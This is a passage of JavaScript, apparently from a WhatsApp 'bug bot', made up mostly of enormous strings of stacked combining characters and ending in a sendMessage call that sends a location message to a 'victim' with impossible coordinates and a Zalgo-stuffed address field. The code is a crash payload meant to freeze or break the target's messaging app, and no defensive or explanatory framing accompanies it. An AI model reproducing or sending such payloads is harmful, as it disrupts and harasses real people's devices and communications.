̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̑͛̌̽̉̀̏̎͜͜͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸̷̧̨̢̢̨̢̡̢̨̧̡̡̡̨̡̧̢̡̨̡̡̡̧̡̢̢̡̡̢̢̢̢̢̡̢̢̨̧̛̛̲̣̝̞̝͖̹̟̣̱͖͇̼̮̜̥̼͙̬͙̼͔͓̰̦͇͈̘͈̘̺̲̤̺̱̮͖̳͚͙͈͔̮͍̹̮̰͚̪̦̼̥͈̠͓̠͖͚͉̱̮͖̪̹̬̻̙͉͈͖̹̹̳͇̠̮͙̹̥̯̥̦̲̘̗̳͚̯̠͖͖͓̥͎͔̤̠͔̣̯͉̯̮̰̹͖̻͎̜̹̖̲̱̜̰̥̟͇̪̥͚̻̯̝͍̞͇̭̩̯͎͙͖̝̱̱̪̻̙̤̮͇͕͍̯̠͕̯̪̫̦̭̦̼̜̠͍͕̖͕̭͕͔̩̼̱͎̯̝͎̻̱̪̗̟̜̬̙͇̫̹̘̮̪͕̯͎͇̤͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͒̔̒͂͂͋̊̈͑̀̾̈́̇͑̈̓́͛̿̍͑̑̄̈́̂̆̏̈́̂͋́́̾̏͛̒̔̏̈́̊͐̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑͘̚͘̚̚̚̕̕͘̚̚͘͜͜͜͠͠͝͝͠͠͠͠͠͠͝ͅͅͅͅͅͅͅͅͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅ`
      commet: xiphone,
      jpegThumbnail: null
    }
  }, { quoted: xbug })
  await xartva.sendMessage(victim, {
    location: {
      degreesLatitude: 999.999,
      degreesLongitude: -99.888,
      name: "> OzzyDevs - *_Suppoerted By Q@T@£ p£0Du©t|0N_*",
      address: '̷̡̢̢̢̢̢̡̢̢̨̧̛͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕͘̚̚͘͜͜͜͠͠͠͠͝ͅ️̴̷̡̢̢̢̢̢̡̢̢̨̧̛̛̱̠͍̟̺͚̖͖̝͓̘͉̗̦̱̫̹̟̥̱͓̞̻̞̹̺͈̜̳̼͖̝̼͉͈̩̳̗̖̝̻̼̭̙̩̣̳͎͙̬̳͕͇͇̺̟̯̠̖̰̻͔̫͉̳̜̻̣͇͈̫͚̱͚͉͚͔͙͕͙̦̖̦̙̯̦̰̲̪̺̞̘̫̤͍̹̪̫̤̙͔̪̬̗̭͚̤̰̪̗̹̹͖̜̗̰̥͇̯̝͉̲̗̮͈͇̪̥̝̲̳̩̲̻͖̖̺͍̱͎̙̻̫͎͔̮̹̳͎̜͓̬͈͎͓̻͇̝̲̣̞͉͈̦͔̞̪̠̻̳͍̪͓̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̈͛̆̐͆̆̐̃̀͗̾́̃͆̅̇̆̈̓̈́́̈́͐̀̓̆̏̇͋́̈́̓̒̋̽̂͂̋͑̑̂̈́́̍̏̈́́͊̌̈͊̋́̓̒́̈̀̓̓͒̄̒̀́̂͆͐͐̅̓̏̈́̑̏̅́̎̍̎̎̈́̑͑̕̕̕̚͘̕̕͘̚̚͘͜͜͜͝͠͠͝͝͝͠͠͠͠͝ͅ️̴̢̡̡̡̛̱̠͍̟̺̣͎̯͙͈̟͔̣̜̻͙͕͍̠͔̯͎͈̳̹̘̘̲̩͓̬̹͍̹̟͎̹̥͚̹̻̲͕̝̰͔̬̬̲̫̘̠̩͓͖͈̱̪̣͎̲̘͚̯͈̫̖̱̫̮̬̘̲͖͙̝̓̇̓̏̇̉̈́̃̿̽̂͒̅̔́̅̀̈̀̆͛̉͆̔͑͋͑̃̿́͋̎̀͆̎̊̀́͛͗̉̊̽̃̄̿͛̓̇̈́̉̃̈́̂͒̉̅͒̈́̀͊̌͒̓͗̓̏̌͒́͋̊̂̎̇̈́̾̈́̀̋͂̒͆̊̕̕̕̚͘̕͜͝͠͠͝͝͝ͅͅͅͅᆞ̶̡̡̢̛̛̛̛̛̤̗̳̪͚̖͎͔͎͔̗͓̼̼̳̯̱̦̣̤̮͈͍̩̟̪̣̼̜̳̥͓̬̥͍͎͙̠̰̹̌́̋͆̊̋͆̓̃͑̋͑̆̎͒̽͊́̒̈́̎̿̅́͑̌̈́̌̂̈́͌̑͊͛̀̇͂̋̍̀̽͐̈̓̓́͑͌͆́̃̈́͒̿̈́́̉̿͊͂̅̈́͑̀͒̒͋͂̄̐̒̿̂̃̀̏̒̿̾̂̔̽͋̆̂̌̊́̌́̈́̾͊̽̎̆̎̃̓̍̈̕͘͘̚̕͘̕̚͘̚͘͘͝͠͝͝͠͠͝͠͝͠͝ͅI̵̡̧̨̡̨̡̢̧̛̛̘̟͇͚̩̦̱̰͍͚̬͕͍͚̗̻͔̜̤͈͇̣͇̞͚͈̱͉͖̼͎̲̩̻͇̫̤͎͕̹͚͕͈͙̻͕̪͓̫̰̬̖͎͖̫̼͎̳̜̝̠͍͉͕͔͎̻̖̞̟̻̮͚͚̱̤͇̥̼͖͔͍̮̩̝̜̮̭̻͕̒̿̆͗̌̄̽̇̃̔͌̍̄̇̌̍͛͂̇͑̏͆̍̎͋̏͋͗͗́̂̋̿̅̉͊̆̔͐̀̒̏̀̇̾̑̌̈́̊̒̏̀̽̾͒̇̿̉̓̈́̅̀̒̾̀̏̑̈́̏̀̓̍́̀̄͊̂̀̂̈́̑͂̂̄͒́̆̊̊͛͂͒̓̃̐̽̌̂̉̆͐̂̈͆̋̀̐͆̉͊̄͌̏͛̈́̂͑̆̋̋̓͌͐̌̒̑̒̓̌̌̃̀͋̏̐̀̍̆̐͊̈̂̔̀̉́̒͐̈̐̈́̚̚̚̚͘͘͘̕͘̕̚͘̚̕̚͜͜͝͠͝͠͠͝͝͝͝͠͠͝͝͠͝ͅͅᆞ̷̡̡̧̨̢̢̡̧̡̧̨̧̡̨̢̨̨̢̧̢̛̛̛͈̘̺̰̪̤͖͓̱̹͕͇̱̜͇̲̩̭͙͖͚̠̦̖̖̤̟̜͙̦̦̫̪̯̖͚͔̞̦̳̬̻̗̻̦̲̩̦̻̗̭̲̭͈̟̦͇͉͉͇̺̰̳͖̮̼̙̟̹͍̙̯̯͉̳͍͇̼͙͉̠̳̜̼͉̗̪̞͓̩͔̩̭͇̮̱͇͉͕̳̠͚͎̻͚͉͇̯̬͔̮̲̩̰͔͕̦̗̺͔̝̟̬̖̞͍͍͓̣̩̼̱̣̱̫̫̤̮̪͚̦̰̳̞̤̻̲̥͓͈̜͖͇̲̞̼̫̯͇̭͉̤̲͎̠̣̈́͛̎̑̍͆͋́̀͆̀̈̐͂͗̉͐̿̉̊̈̔̿̊͌̍͗̀̆̈́̓̐̉̓̈́͂̏̊͋̒̌̾̋̂̏̍̄̋̅̓̇̂̓̆̌͐͌̒͑́͋̒͆̽̂͊̒̃͐̈͛̇̀͆̐̂͑̓̾͆̍̋͐̓͗̽̔͊̒́̎̈́̽̒̈̓͊̂̄͋͛̾̔́̀̌͛͒͒͑̅̚͘̕͘̚̚͘͜͜͜͜͜͜͠͝͝͝͠ͅͅͅͅᆞ̸̨̢̢̢̡̛̛̛̛̛͓̻̬͙̦̙̭̪̞͕̳͙̜̜̰̫͕͈̲̙͖̯̝͚̻̭̪̮̳̙̝̙̣̻͍͙͕̾͗̍̈̄̽̀̑̉̆̿̈́̇̓̿͋̍̄̽͗̈͌̃̓͌̇̈́̀̾̾̿͛̋͐̆͑́͐̏̐̑̀̈́́̌̐̃̄̀͆̋́̈́̄͌̓́̑̇̃̽̉̔̾́̅̌̆̐̽͂̂͒̒̌̊̄͂̓͒̍̊̎̾̈́͆̒̓͐̀̏̍̿͒̇́̓̾͌͆͌͌̽́̔͊̎̿̀͆̂̐̐̋̅͗̆̓̉̔͒̈́́͌͊̾̀̿͆͐̂͑́̀̒̂̀̽͂͒̉̒̍̍͌̿̀́́̈̂̓͗͒̏̔͛̃͊̔͒͗̏̓̅́̅͋̾̿̈̇̇̋͒͐̈́̔̈́̒̈̄̏̑̾̍̑̃̈̿̓̀͒̃͌̽̾̔̒̂̈́̎̚̚̕̕̚̚͘͘̕͘̚̚̕̕͘͘͜͝͝͝͝͝͝͠͝͝͝͝͠͝͝͝͝ͅͅỚ̸̡̢̨̡̨̧̧̢̡̢̢̡̢̡̡̢̡̧̢̢̧̧̛̛̛̛͙̜̲̻͕̙̝̖̲̖̦͉̫̺͕̟̲͕̲̹̮̰̥̗̰̝̯̞̩̥͇͍͍̖̣͈̗̝̪͚͔͇̼̺͓͉̗̤̞̰͇̤͈̠͙͙͈̠̼͈̮͓͉̺̩̤͔̩̩̰͙̟̠̠̟̣̭͙̘̰̖͚̹̬̘̳̤̟̯͎͖̠͎̳̝̫̗̳̮̫̭̲̦͍̫͕͇̖̝̯̞͙̝̜̲̘̺͓̪̗̯̟̓̓̾̾̏̽̆̍̈̋̄̂̉̾͒̍̔̈̎͊̓͛̊͒̀̃͑͒̋̀̈́̂̋̏̐̇̈́̓̎̀̓̿̏͒̓͊̀̏̄͌͐͌̏͌̽̽̽̄̀̿̇͋̏̀͐̓̊͋̐̀̄̍̏͐̄̈́̎̃̀͌̎̊́̆̈́̅́͊̇̒͊̋̓͗̈́̒͛͌̔̉͛̐̆̑͌͛̓͗̇͑͐̈́̈́̑͛̌̽̉̀̏̎̚͘͘͘͘͜͜͝͠͝͠͝͠͝ͅͅͅͅᆞ̶̨̧̨̡̡̡̡̢̨̡̢̨̢̢̧̨̨̨̧̛̛̛̛̛̭͇̯̼̘̲̣̯͍̫̭͎̯͙̼͔̰͍̖̯̰̙̭͎̥͖̳̞̞̘̬̗̩̬̬͕̥̬̻̯̲̺̗̳̮̻̞̫͙̣̘̹̳͎̰̲͈̹̱̪͇̬̪̤͙̠̖͔̭͓̤͎̤̠̳̱̗̣͔̣͙̞͚͕̞̗̦̳͚̟̝̜̤̣͇̙͍̣̳̻̭̬̳͎̝̭̳̝͍̳̺̏̂̋͆̉̋͛͐̀̓̓̊͗̐͒̄̀̏̌͗͐̓̿̒͑̐̉̆̀̀͑͒̌͛͋̋̓̾́̽̎̉͐̄̐͑̈́͒̔̾́͑̍̈́̅̅̇͗̉̓͐̿̈́̃̔̏͑̾̚͘̚̚͜͜͝͝͠ͅᆞ̴̡̧̡̫͎̰̝̞̹̼̫̮̯̲̟̟͕̳̭̙̲̪̥̥̼̩̦̯̹̳̭̯͎̗̤͕̼̫͓̺̮̈̄͛̌͠Ş̸̢̡̨̡̢̡̡̢̡̡̧̨̡̨̧̢̡̧̨̝̰͉͓͖̳̺̠͇̮̩̬͍͇͚̜̗̮̣̤͉͎̹̺̭͙͓͔̰̥͚̠̪̩̗̳̭̙̟̯̙̳̘̖̬̟̘̜̭͍͇͚̹͚͇̺̠͖̫͕͉͉͎͖̣̯̭̼̘̗̰̤̯͖̼̯̱̖̟̲̻̭̩̜̗̥͔̹͕͓̙͈͎͎̮̗̣̩̠̜̪͍̱̯͉̺̥̮̯̭͎̟̥̯̼̹̜̥̫̬͖̲̘̝̖̲̱͉̟̝͚̘̪̙͉̭͙̠̙̦͚̰̩̬͉̹̝̭̥̲͚̖͔̣̫͈̥͍̘͖̰̦̖̺̜̭̦̞̼̠̣̮̭̻͔͕̯̭̝̼̞͎͈͖̤͉̮̬̺̦͙̩̭͓͎̩̩̣̱̰̫̖̞̣͈̦͔͖̑͑͗̈́̉̿͌̒̉͛̊̆̈̽̀̅̊̈͑̈́̿̓̋̀͑̓̀̈̾̀̔̋̊̑̐̃̐̆̈̓͐͑̾̐̇̈̃̑͆̚͘͜͜͜͜͠͝͝ͅͅͅͅͅᆞ̸́͊̈̊̽̎̇̓͌̈̄͊͑͆̈́̀̅̈́̑̐̽̎̎͘̚͠͠